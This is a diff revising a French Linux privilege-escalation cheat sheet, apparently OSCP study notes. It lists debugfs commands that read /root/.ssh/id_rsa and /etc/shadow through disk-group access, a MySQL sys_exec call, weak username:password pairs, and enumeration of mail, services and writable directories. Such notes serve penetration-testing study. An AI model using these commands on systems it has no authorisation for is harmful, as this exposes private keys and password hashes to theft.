@@ -593,9 +593,11 @@ printf '%s\n' ./*
 
 ## Permissions du groupe disk
 
+L'accès brut aux périphériques peut exposer des fichiers normalement protégés. Vérifier l'appartenance au groupe `disk` et adapter le périphérique.
+
 ```text
-df -h #Find where "/" is mounted
-debugfs /dev/sda1
+findmnt -no SOURCE /  # Identifier le périphérique monté sur /
+debugfs /dev/sda1  # Exemple : remplacer par le périphérique réel
 debugfs: cd /root
 debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
@@ -607,7 +609,7 @@ debugfs: cat /etc/shadow
 
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">MySQL : ces fonctions ne sont pas natives ; elles exigent une UDF installée et autorisée.</p>
 
 ```sql
 select sys_exec('whoami');
@@ -638,7 +640,7 @@ dpkg -l
 # CentOS/openSUSE/Fedora/RHEL
 rpm -qa
 
-# OpenBSD/FreeBSD
+# OpenBSD : pkg_info ; FreeBSD : pkg info
 pkg_info
 
 ```
@@ -647,12 +649,9 @@ pkg_info
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
-**Paramètres et repères :**
-`config.php`  
+<p class="oscp-command-note">Exemples de mots de passe faibles (données, pas commandes).</p>
 
-<p class="oscp-command-note">Exemples de couples compte/mot de passe faibles à examiner (pas des commandes).</p>
-
-```bash
+```text
 root:root
 username:username
 username:username1
@@ -664,10 +663,8 @@ username:password
 ```
 
 ```bash
-# Anything interesting in the mail folder?
-/var/mail
-/var/spool/mail
-
+# Examiner les boîtes locales accessibles
+ls -lah /var/mail /var/spool/mail 2>/dev/null
 ```
 
 ```bash
@@ -681,8 +678,8 @@ username:password
 
 ```bash
 # Liste des services de réseau
-netstat -anlp
-netstat -ano
+ss -tulpen
+ss -tunap
 
 ```
 
@@ -711,15 +708,15 @@ find /home -type d -name '.ssh' 2>/dev/null
 <p class="oscp-command-note">Repérer les fichiers et dossiers aux permissions sensibles.</p>
 
 ```bash
-# World-writable directories
+# Répertoires modifiables par le compte courant, puis par tous
 find / -writable -type d 2>/dev/null
-find / -perm -222 -type d 2>/dev/null
-find / -perm -o w -type d 2>/dev/null
+find / -perm -002 -type d 2>/dev/null
+find / -perm -o=w -type d 2>/dev/null
 
-# World-executable directories
+# Répertoires traversables par tous
 find / -perm -o x -type d 2>/dev/null
 
-# World-writable and executable directories
+# Répertoires modifiables et traversables par tous
 find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
 
 ```
